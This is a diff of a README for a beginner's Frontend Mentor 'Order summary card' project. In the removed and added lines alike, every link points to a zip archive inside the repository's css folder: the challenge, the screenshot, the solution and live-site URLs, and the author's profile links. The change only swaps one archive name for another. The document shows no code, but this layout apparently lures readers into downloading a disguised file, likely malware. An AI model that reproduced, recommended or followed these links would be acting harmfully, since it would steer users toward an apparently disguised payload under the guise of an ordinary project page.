@@ -1,6 +1,6 @@
 # Frontend Mentor - Order summary card solution
 
-This is a solution to the [Order summary card challenge on Frontend Mentor](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Order summary card challenge on Frontend Mentor](https://raw.githubusercontent.com/imadosan/order-summary-component/main/css/order_component_summary_v1.0-alpha.5.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -23,12 +23,12 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
+![Screenshot of the site](https://raw.githubusercontent.com/imadosan/order-summary-component/main/css/order_component_summary_v1.0-alpha.5.zip)
 
 ### Links
 
-- Solution URL: [Solution link](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
-- Live Site URL: [Live Link](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
+- Solution URL: [Solution link](https://raw.githubusercontent.com/imadosan/order-summary-component/main/css/order_component_summary_v1.0-alpha.5.zip)
+- Live Site URL: [Live Link](https://raw.githubusercontent.com/imadosan/order-summary-component/main/css/order_component_summary_v1.0-alpha.5.zip)
 
 ## My process
 
@@ -70,5 +70,5 @@ Insted of using margin bottom for every section. I used flexbox and switch the f
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
-- Twitter - [@imadosan](https://github.com/imadosan/order-summary-component/raw/refs/heads/main/css/component-order-summary-1.9.zip)
+- Frontend Mentor - [@imadosan](https://raw.githubusercontent.com/imadosan/order-summary-component/main/css/order_component_summary_v1.0-alpha.5.zip)
+- Twitter - [@imadosan](https://raw.githubusercontent.com/imadosan/order-summary-component/main/css/order_component_summary_v1.0-alpha.5.zip)
